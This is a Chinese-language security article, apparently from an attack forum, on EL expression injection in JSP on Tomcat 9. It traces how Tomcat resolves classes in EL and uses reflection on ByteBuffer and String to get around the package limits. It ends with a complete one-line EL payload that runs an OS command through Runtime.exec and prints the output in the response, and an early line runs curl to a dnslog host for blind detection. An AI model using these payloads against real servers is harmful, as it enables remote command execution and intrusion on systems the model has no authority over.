EL表达式多用于JSP，官方给出的El表达式的example:  
<https://javaee.github.io/tutorial/jsf-el007.html>

可以发现，EL表达式支持基础的计算和函数调用。并且在EL表达式中还提供隐式对象以便开发者能够获取到上下文变量。基础的EL表达式可参考文章：  
[https://www.tutorialspoint.com/jsp/jsp\_expression\_language.htm](https://www.tutorialspoint.com/jsp/jsp_expression_language.htm)

下面直接进入主题，本文的环境为：  
jdk8u112  
Tomcat9.0.0M26

思路梳理
====

在EL表达式中，要做到执行`Runtime#exec`并不难，只需要一行表达式：

```jsp
${Runtime.getRuntime().exec("cmd /c curl xxx.dnslog.cn")}
```

可这样子只能做基本的检测和盲打，如果目标不出网或不知道网站绝对路径时，将不方便`EL`注入的探测。

写普通的Java代码的话，我们知道可以使用`inputStream()`来获取`Runtime#exec`的输出，然后打印出来，如下:

*`Runtime#exec` Demo*

```java
try {
    InputStream inputStream = Runtime.getRuntime().exec("ipconfig").getInputStream();
    Thread.sleep(300); //睡0.3秒等InputStream的IO，不然`availableLenth`会是0
    int availableLenth = inputStream.available();
    byte[] resByte = new byte[availableLenth];
    inputStream.read(resByte);
    String resString = new String(resByte);
    System.out.println(resString);
} catch (Exception e) {
    e.printStackTrace();
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-2fbe2ec97314bf1b8b3c85ca572f116b79df444a.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-2fbe2ec97314bf1b8b3c85ca572f116b79df444a.png)

不过EL表达式的实现其实是由中间件（Tomcat）进行解析，然后反射调用的。所以实际上写EL表达式只能写**函数调用**，不能在EL表达式中写诸如 `new String();`、`int a;` 这些操作。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-836cd7dbcc58177a66224b340b77ed018f2ed68c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-836cd7dbcc58177a66224b340b77ed018f2ed68c.png)

**但正常函数调用是能用的，比如本节开头执行`Runtime#exec`的表达式。**

EL表达式中有许多隐式对象，如`pageContext`，可以通过这个对象保存属性，如：

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5061fd4fde1b7137396b43a4d4b4579dfe5aebd4.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5061fd4fde1b7137396b43a4d4b4579dfe5aebd4.png)

此时一个想法便油然而生：

1. 使用`pageContext`保存`Runtime#exec`的`inputStream`
2. `inputStream#read`会将命令执行结果输入到一个`byte[]`变量中，但EL表达式不能直接创建变量。得想办法找到一个存在`byte[]`类型变量的对象，借用该对象的`byte[]`作为`inputStream#read`的参数
3. 使用反射创建一个`String`，并将第2步的`byte[]`存入这个`String`中
4. 输出该`String`

经过这四个步骤，理论上应该能获取到命令执行的回显了。

保存 `Runtime#exec`的`inputStream`
===============================

这个步骤很简单，就一句EL表达式就能搞定，如下：

```jsp
${pageContext.setAttribute("inputStream", Runtime.getRuntime().exec("cmd /c ipconfig").getInputStream())}
```

调试也可发现`pageContext.attributes`存入了`inputStream`

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-eb1b65416b00669b9cb08786f4e641a7d417304c.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-eb1b65416b00669b9cb08786f4e641a7d417304c.png)

寻找存在`byte[]`的对象
===============

一开始我是直接在`pageContext`中寻找有无符合的对象。确实有，找到了`pagaContext.response.response.outputBuffer`：

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5c28f7dd01cc8d6a07624b01a869970ecdbf16e5.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5c28f7dd01cc8d6a07624b01a869970ecdbf16e5.png)

可是实验之后发现不这个不太好，理由：由于我并没有分析过Tomcat源码，但猜测该变量应该是控制`Response`二进制输出的，如果直接让inputStream直接覆写掉这个变量，担心引发奇怪的问题。并且直接覆写上下文对象的属性感觉太粗暴了，希望能找一种对Tomcat干预最少的方式。

最后找到了**`java.nio.ByteBuffer`**，该类可以创建一个指定大小的`byte[]`。在java中的用法如下：

*java.nio.ByteBuffer Demo*

```java
ByteBuffer allocate = ByteBuffer.allocate(100); #静态调用
byte[] a = allocate.array();
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-162fc77af7c81d1d92820951f981769516a6481d.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-162fc77af7c81d1d92820951f981769516a6481d.png)

尝试在El表达式中使用：

*java.nio.ByteBuffer EL Demo*

```jsp
${pageContext.setAttribute("byteBuffer", java.nio.ByteBuffer.allocate(100))}
${pageContext.setAttribute("byteArr", pageContext.getAttribute("byteBuffer").array())}
```

调试时发现，并没有如愿的将之存放到`pageContext.attributes`中

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f10af13756d02cb908f03a813322006a4f323e9b.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-f10af13756d02cb908f03a813322006a4f323e9b.png)

猜测可能是执行`java.nio.ByteBuffer.allocate(100)`报错了，需要调试`${pageContext.setAttribute("byteBuffer", java.nio.ByteBuffer.allocate(100))}`，看看其是如何被解析的。也不用研究太深，简单看看问题即可。

追踪`ByteBuffer.allocate`报错
-------------------------

调试`${pageContext.setAttribute("byteBuffer", java.nio.ByteBuffer.allocate(100))}`。中间件对这一行的解析调用在

`org.apache.jasper.runtime.PageContextImpl`

*PageContextImpl#proprietaryEvaluate*

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cda6278db9b530f7af4f8a5e3a3e9b8b6de5a796.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cda6278db9b530f7af4f8a5e3a3e9b8b6de5a796.png)

跟进`ve.getValue(ctx);`。发现在`ValueExpressionImpl.node`成员变量中，存放着已经简单解析过的EL表达式

*ValueExpressionImpl#getValue*

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-de3a29aef8086e4f4ac76ab4493deb28316346dd.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-de3a29aef8086e4f4ac76ab4493deb28316346dd.png)

这个节点可以抽象表示成这样：

```java
node
 0 - pageContext
 1 - setAttribute
 2 - 
   0 - byteBuffer
   1 - 
     0 - java
     1 - nio
     2 - ByteBuffer
     3 - allocate
     4 - 
       0 - 100
```

对比下我们原版EL表达式：

```jsp
${pageContext.setAttribute("byteBuffer", java.nio.ByteBuffer.allocate(100))}
```

可以发现，Tomcat将我们的EL表达式划分成了**节点**的结构，按照`()`划分`父节点`和`子节点`，按照`.`划分同级节点

跟进`this.getNode().getValue(ctx);`。在`getValue()`中，对`node`进行了迭代操作。

在`mps.getParameters(ctx)`这一行中，`getParameters()`函数是解析`子节点`的操作，跟进。我们的目的是查找为什么`java.nio.ByteBuffer.allocate(100)`不生效，所以解析表达式是需要跟进调试的

*AstValue#getValue*

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e5226307bbfa1270c9078873c476f62b40cfd52d.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e5226307bbfa1270c9078873c476f62b40cfd52d.png)

跟进到`getParameters()`函数。该函数作用是通过**循环**调用各个`child`的`getValue()`方法。如果是`child`是`Node`类型，则会调用上文的`AstValue#getValue`形成递归，直到拿到最底层的`node`。

不要忘记我们目标是查找`java.nio.ByteBuffer.allocate(100)`不生效的问题。所以我们需要在循环中**步过**到解析`java.nio.ByteBuffer.allocate(100)`时再跟进调试

*AstMethodParameters#getParameters*

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cc0702cea0abc387efe237d8ab39aefbedc1bc1f.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cc0702cea0abc387efe237d8ab39aefbedc1bc1f.png)

跟进`this.jjtGetChild(i).getValue(ctx)`，此时将会递归调用回`AstValue#getValue`。

该方法的第一行创建了一个`base`。值得注意的是在`while()`中若`base`为`null`，就会直接`return base`。

`while()`是执行 *EL表达式调用方法* 的代码块，感兴趣可以自己调试下。

*AstValue#getValue*  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-dbc5d89617130e1998c72b6812a8257352dd2bb2.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-dbc5d89617130e1998c72b6812a8257352dd2bb2.png)

跟进`this.children[0].getValue(ctx);`中，发现又调用了一个`getValue()`

*AstIdentifier#getValue*

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-475dba5042198998e51a2671c4525fd364ed68fd.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-475dba5042198998e51a2671c4525fd364ed68fd.png)

跟进`ctx.getELResolver().getValue(ctx, null, this.image);`。发现又调用了`resolvers[i].getValue`

*JasperELResolver#getValue*  
[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c45525aba1b2b2c8ad32e61a048a63447a8a7aec.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c45525aba1b2b2c8ad32e61a048a63447a8a7aec.png)

跟进`resolvers[i].getValue(context, base, property);`。根据函数名猜测`resolveClass()`函数是对El表达式进行类解析。

*ScopedAttributeELResolver#getValue*

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c76613b516f9c373be0b46d077f437acac87d0fc.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c76613b516f9c373be0b46d077f437acac87d0fc.png)

跟进`importHandler.resolveClass(key);`发现，该函数确实是对EL表达式里的字符串进行“类解析”。

首先一开始判断字符串是否在`clazzes`中，这个变量存放着之前解析过的类。如果同名就直接复用。

*ImportHandler#resolveClass*

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-513551ad2114ab772fc3848cdab4cffac0d59a09.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-513551ad2114ab772fc3848cdab4cffac0d59a09.png)

一路跟进下去，最终发现类加载的范围只在四个包下

- `java.lang`
- `javax.servlet`
- `javax.servlet.http`
- `javax.servlet.jsp`

*ImportHandler#resolveClass*

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-46c000c9d095bb61fdf28d0d9abc087bb0de2e57.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-46c000c9d095bb61fdf28d0d9abc087bb0de2e57.png)

`java.nio.ByteBuffer.allocate(100)`不生效的问题找到原因了，因为el的类加载机制并没有`java.nio`包，并且还不支持全类名输入。

看到这里可能小伙伴会好奇：EL解析时将字符串按`.`进行了分割，如果认为每一个`.`分割的字符串都是一个新类并以此解析类名的话，那类的方法不就无法被正常解析嘛？如下面的例子：

`Runtime.getRuntime.exec("calc")`

按照EL表达式的解析，这个字符串会被解析成这样：

```java
0 - Runtime
1 - getRuntime
2 -
  null
3 - exec
4 - 
  0 - "calc"
```

EL解析时肯定会找不到`getRuntime`和`exec`的类的。那EL解析时是如何认为这俩是一个方法的呢？

答案在一开始的`AstValue#getValue`中。如下：

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1e45eb0e29f5334528af9bb3f9f8a9b3bca03b96.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1e45eb0e29f5334528af9bb3f9f8a9b3bca03b96.png)

- `1` - 在一开头就将第0个解析字符串，即`Runtime`丢去解析类（注意这里有很多重递归）
- `2`和`3` - 循环所有其他索引从1开始的节点。并对之进行`invoke()`操作

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b39115fa8be4ac7c5ca7becf12de450909db80d8.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b39115fa8be4ac7c5ca7becf12de450909db80d8.png)

这就是EL解析类及调用类方法的大致过程。

实例化ByteBuffer类的Bypass
=====================

既然不能直接使用`java.nio`包下的`ByteBuffer`。那我们用反射搓一个出来不久可了嘛？

修改Poc如下:

```jsp
//执行系统命令
${pageContext.setAttribute("inputStream", Runtime.getRuntime().exec("cmd /c ipconfig".getInputStream())}
//停一秒，等待Runtime的缓冲区全部写入完毕
${Thread.sleep(1000)}
//读取Runtime inputStream所有的数据
${pageContext.setAttribute("inputStreamAvailable", inputStream.available())}

//通过反射实例化ByteBuffer，并设置heapByteBuffer的大小为Runtime数据的大小
${pageContext.setAttribute("byteBufferClass", Class.forName("java.nio.ByteBuffer"))}
${pageContext.setAttribute("allocateMethod", byteBufferClass.getMethod("allocate", Integer.TYPE))}
${pageContext.setAttribute("heapByteBuffer", allocateMethod.invoke(null, inputStreamAvailable))}
```

成功调用，`pageContext`中也有对应的值。

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-069299ac6c43d62a59d362a423e4d6ac2a2c3c34.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-069299ac6c43d62a59d362a423e4d6ac2a2c3c34.png)

有了合适大小的`byte[]`后，接下来要做的事情就很简单了：将`Runtime,inputStream`的`byte[]`传给`heapByteBuffer`。

Poc如下：

```java
......
${pageContext.getAttribute("inputStream").read(heapByteBuffer.array(), 0, inputStreamAvailable)}
......
```

接下来就是将`byte[]`类型的数据转换成`String`，以便能直接在网页上回显。常规的方法就是使用`new String(byte[])`来实现。

这里有几点需要注意：

1. 由于不能直接用`new`，我们只能通过反射来拿到`String`实例
2. 反射调用`String#String`时，需要指定传参类型的对象。但是似乎没有`Byte[].TYPE`这种东西。不过我们可以通过`byteArrType`里的`byte[]`，用`getClass()`得到`byte[]`类型对象。

```jsp
......
//获取byte[]对象
${pageContext.setAttribute("byteArrType", heapByteBuffer.array().getClass())}
//构造一个String
${pageContext.setAttribute("stringClass", Class.forName("java.lang.String"))}
${pageContext.setAttribute("stringConstructor", stringClass.getConstructor(byteArrType))}
${pageContext.setAttribute("stringRes", stringConstructor.newInstance(heapByteBuffer.array()))}
//回显结果
${pageContext.getAttribute("stringRes")}
```

压缩成一句话

```jsp
${pageContext.setAttribute("inputStream", Runtime.getRuntime().exec("cmd /c dir").getInputStream());Thread.sleep(1000);pageContext.setAttribute("inputStreamAvailable", pageContext.getAttribute("inputStream").available());pageContext.setAttribute("byteBufferClass", Class.forName("java.nio.ByteBuffer"));pageContext.setAttribute("allocateMethod", pageContext.getAttribute("byteBufferClass").getMethod("allocate", Integer.TYPE));pageContext.setAttribute("heapByteBuffer", pageContext.getAttribute("allocateMethod").invoke(null, pageContext.getAttribute("inputStreamAvailable")));pageContext.getAttribute("inputStream").read(pageContext.getAttribute("heapByteBuffer").array(), 0, pageContext.getAttribute("inputStreamAvailable"));pageContext.setAttribute("byteArrType", pageContext.getAttribute("heapByteBuffer").array().getClass());pageContext.setAttribute("stringClass", Class.forName("java.lang.String"));pageContext.setAttribute("stringConstructor", pageContext.getAttribute("stringClass").getConstructor(pageContext.getAttribute("byteArrType")));pageContext.setAttribute("stringRes", pageContext.getAttribute("stringConstructor").newInstance(pageContext.getAttribute("heapByteBuffer").array()));pageContext.getAttribute("stringRes")}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-884484bbb35edaf688d3723665b7d324af1550dc.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-884484bbb35edaf688d3723665b7d324af1550dc.png)